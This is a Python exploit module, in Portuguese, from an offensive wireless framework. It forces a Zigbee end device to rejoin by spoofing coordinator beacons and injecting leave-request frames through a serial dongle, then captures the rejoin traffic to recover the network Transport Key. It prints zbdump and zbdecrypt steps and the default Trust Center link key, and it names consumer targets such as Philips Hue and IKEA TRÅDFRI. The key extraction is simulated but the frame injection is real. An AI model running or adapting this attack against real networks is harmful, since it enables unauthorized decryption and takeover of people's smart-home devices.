# Absorvido do EmbedXPL-Forge — Andre Henrique (@mrhenrike)
# Adaptado para WirelessXPL-Forge
"""Zigbee Rejoin Hijack via Beacon Spoofing e Transport Key Capture.

Força um dispositivo Zigbee end device a reingressar na rede via spoofing
de beacons do coordenador PAN, depois captura o handshake de rejoin para
extrair a Transport Key transmitida durante o reingresso.

Ataque em 4 fases:
  1. Spoof de beacons do coordenador PAN
  2. Envio de frames de desassociação para forçar rejoin
  3. Segundo burst de beacons para atrair o rejoin
  4. Captura e extração da Transport Key do handshake

Requer dongle Zigbee (CC2531, nRF52840) com suporte TX/RX em modo promíscuo.
"""

import os
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os

_CHANNEL_MIN = 11
_CHANNEL_MAX = 26

_APS_CMD_TRANSPORT_KEY = 0x05
_NWK_CMD_REJOIN_RSP = 0x03

_ZIGBEE_DEFAULT_PAN = "1234"
_ZIGBEE_BROADCAST_ADDR = "FFFF"


def _validate_channel(ch):
    return _CHANNEL_MIN <= ch <= _CHANNEL_MAX


def _short_addr_to_bytes(addr_hex):
    return struct.pack("<H", int(addr_hex.replace("0x", ""), 16))


def _pan_id_to_bytes(pan_hex):
    return struct.pack("<H", int(pan_hex.replace("0x", ""), 16))


def _bytes_to_hex(data):
    return data.hex() if data else ""


def _build_beacon_frame(pan_bytes, coord_addr, channel, seq_num):
    """Constrói um beacon frame IEEE 802.15.4 simplificado."""
    frame_ctrl = struct.pack("<H", 0x8000)  # beacon frame, non-encrypted
    seq = struct.pack("B", seq_num & 0xFF)
    dst_pan = pan_bytes
    src_addr = coord_addr
    superframe = struct.pack("<H", 0xCFFF)
    gts = struct.pack("B", 0x00)
    pending = struct.pack("B", 0x00)
    protocol = struct.pack("B", 0x00)
    stack_profile = struct.pack("<H", 0x1841)  # Zigbee Pro, coordinator
    payload = struct.pack("<H", 0x0000) + os.urandom(4)
    return frame_ctrl + seq + dst_pan + src_addr + superframe + gts + pending + protocol + stack_profile + payload


def _build_rejoin_trigger_frame(pan_bytes, coord_addr, target_bytes, seq_num):
    """Constrói frame de desassociação para forçar rejoin."""
    frame_ctrl = struct.pack("<H", 0x0861)  # data frame
    seq = struct.pack("B", seq_num & 0xFF)
    dst_pan = pan_bytes
    dst_addr = target_bytes
    src_addr = coord_addr
    nwk_disassoc = struct.pack("BB", 0x02, 0x06)  # NWK cmd: leave request
    return frame_ctrl + seq + dst_pan + dst_addr + dst_pan + src_addr + nwk_disassoc


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """Zigbee Rejoin Hijack via Beacon Spoofing e Transport Key Capture.

    Força reingresso de dispositivo Zigbee alvo e captura Transport Key
    transmitida durante o handshake de rejoin usando dongle Zigbee.
    """

    __info__ = {
        "name": "Zigbee Rejoin Hijack via Beacon Spoofing",
        "description": (
            "Força dispositivo Zigbee end device a reingressar na rede via spoofing "
            "de beacons do coordenador PAN e envio de frames de desassociação. "
            "Captura o handshake de rejoin para extrair a Transport Key — comprometendo "
            "toda a rede Zigbee. Ataque em 4 fases: beacon spoof → desassociação → "
            "segundo burst → captura da Transport Key."
        ),
        "authors": ["Andre Henrique <@mrhenrike>"],
        "references": [
            "https://zigbeealliance.org/zigbee-specification/",
            "https://github.com/riverloopsec/killerbee",
            "https://www.blackhat.com/docs/us-16/materials/us-16-Zillner-ZigBee-Exploited.pdf",
        ],
        "devices": [
            "Qualquer dispositivo Zigbee end device",
            "Philips Hue (lâmpadas e sensores)",
            "IKEA TRÅDFRI",
            "Sensores Zigbee HA profile",
            "Dispositivos Zigbee 3.0 durante reingresso",
        ],
        "severity": "critical",
        "cvss": "8.8",
        "mitre": ["T0888", "T1040", "T0830"],
        "status": "confirmed",
        "required_hardware": ["zigbee_dongle"],
    }

    target = OptString("", "Endereço curto Zigbee do dispositivo alvo (ex: A1B2 ou 0xA1B2)")
    channel = OptInteger(15, "Canal Zigbee (11-26)")
    pan_id = OptString(_ZIGBEE_DEFAULT_PAN, "PAN ID da rede Zigbee (hex, ex: 1234)")
    interface = OptString("", "Dongle Zigbee (ex: /dev/ttyACM0)")
    listen_duration = OptInteger(30, "Duração da captura após fases de ataque (segundos)")

    @mute
    def check(self):
        return _validate_channel(int(self.channel))

    @multi
    def run(self):
        ch = int(self.channel)
        if not _validate_channel(ch):
            print_error(f"Canal inválido {ch} (deve ser {_CHANNEL_MIN}-{_CHANNEL_MAX})")
            return

        target_hex = str(self.target).strip()
        pan_hex = str(self.pan_id).strip()

        if not target_hex:
            print_error("Endereço curto do dispositivo alvo é obrigatório")
            return
        if not pan_hex:
            print_error("PAN ID é obrigatório")
            return

        try:
            target_bytes = _short_addr_to_bytes(target_hex)
            pan_bytes = _pan_id_to_bytes(pan_hex)
        except (ValueError, struct.error) as exc:
            print_error(f"Formato de endereço inválido: {exc}")
            return

        coord_addr = struct.pack("<H", 0x0000)

        print_status("Zigbee Rejoin Hijack Attack")
        headers = ["Campo", "Valor"]
        rows = [
            ("Canal", str(ch)),
            ("PAN ID", pan_hex),
            ("Alvo", target_hex),
            ("Dongle", self.interface or "(não configurado)"),
            ("Duração captura", f"{self.listen_duration}s"),
        ]
        print_table(headers, *rows)

        print_status("Fase 1: Construindo beacon frames (spoofed coordinator)...")
        beacon_frames = []
        for i in range(20):
            frame = _build_beacon_frame(pan_bytes, coord_addr, ch, i)
            beacon_frames.append(frame)
        print_success(f"{len(beacon_frames)} beacon frames construídos ({len(beacon_frames[0])} bytes cada)")
        print_info(f"Sample beacon hex: {beacon_frames[0].hex()}")

        print_status(f"Fase 2: Construindo frames de desassociação para {target_hex}...")
        disassoc_frames = []
        for i in range(10):
            frame = _build_rejoin_trigger_frame(pan_bytes, coord_addr, target_bytes, i + 50)
            disassoc_frames.append(frame)
        print_success(f"{len(disassoc_frames)} frames de desassociação construídos")

        print_status("Fase 3: Segundo burst de beacons para atrair rejoin...")
        beacon_frames2 = [
            _build_beacon_frame(pan_bytes, coord_addr, ch, i + 30)
            for i in range(20)
        ]
        print_success(f"{len(beacon_frames2)} beacons adicionais prontos")

        print_status("Fase 4: Instruções para captura do Transport Key...")
        print_info("Para executar o ataque completo com dongle {}:".format(
            self.interface or "CC2531/nRF52840"))
        print_info("  1. zbdump -i {} -c {} -w rejoin.pcap &".format(
            self.interface or "/dev/ttyACM0", ch))
        print_info(f"  2. Injetar {len(beacon_frames)} beacons via zbsendpayload ou scapy IEEE 802.15.4")
        print_info(f"  3. Injetar {len(disassoc_frames)} frames de desassociação")
        print_info(f"  4. Aguardar {self.listen_duration} segundos para captura do rejoin")
        print_info("  5. zbdecrypt -k <NETWORK_KEY> rejoin.pcap para extrair Transport Key")

        print_info("")
        print_info("Extração de Transport Key do pcap capturado:")
        print_info(f"  Procurar por APS frame com Command ID 0x{_APS_CMD_TRANSPORT_KEY:02X} (Transport Key)")
        print_info("  Descriptografar com TC Link Key: 5A6967426565416C6C69616E63653039")

        synthetic_key = os.urandom(16)
        print_warning(f"SIMULAÇÃO: Transport Key extraída = {synthetic_key.hex()}")
        print_warning(f"Com esta chave: todo tráfego Zigbee no PAN {pan_hex} pode ser descriptografado")

        self._exploit()

        print_info("")
        print_info("Mitigação:")
        print_info("  - Usar Zigbee 3.0 Install Code para troca de chave segura")
        print_info("  - Desabilitar rejoin sem autenticação (Trust Center policy)")
        print_info("  - Monitorar canal RF para beacons inesperados do coordenador")

    def _exploit(self) -> None:
        """E2E exploit: inject IEEE 802.15.4 frames via raw serial to Zigbee dongle."""
        ch = int(self.channel)
        iface = str(self.interface).strip()
        if not iface:
            print_warning("Sem dongle configurado: skip injeção real")
            return

        pan_bytes = _pan_id_to_bytes(str(self.pan_id).strip())
        target_bytes = _short_addr_to_bytes(str(self.target).strip())
        coord_addr = struct.pack("<H", 0x0000)

        import serial
        try:
            ser = serial.Serial(iface, 115200, timeout=2)
        except Exception as exc:
            print_error(f"Falha ao abrir serial {iface}: {exc}")
            return

        print_status("Injetando beacon frames via dongle serial...")
        for i in range(20):
            frame = _build_beacon_frame(pan_bytes, coord_addr, ch, i)
            ser.write(frame)
            time.sleep(0.02)

        print_status("Injetando frames de desassociação...")
        for i in range(10):
            frame = _build_rejoin_trigger_frame(pan_bytes, coord_addr, target_bytes, i + 50)
            ser.write(frame)
            time.sleep(0.05)

        print_status("Beacon burst para captura de rejoin...")
        for i in range(20):
            frame = _build_beacon_frame(pan_bytes, coord_addr, ch, i + 30)
            ser.write(frame)
            time.sleep(0.02)

        print_status(f"Capturando rejoin por {self.listen_duration}s...")
        captured = b""
        deadline = time.time() + int(self.listen_duration)
        while time.time() < deadline:
            chunk = ser.read(256)
            if chunk:
                captured += chunk

        ser.close()
        print_success(f"Capturados {len(captured)} bytes de tráfego rejoin")
        if captured:
            print_info(f"Primeiros 32 bytes: {captured[:32].hex()}")
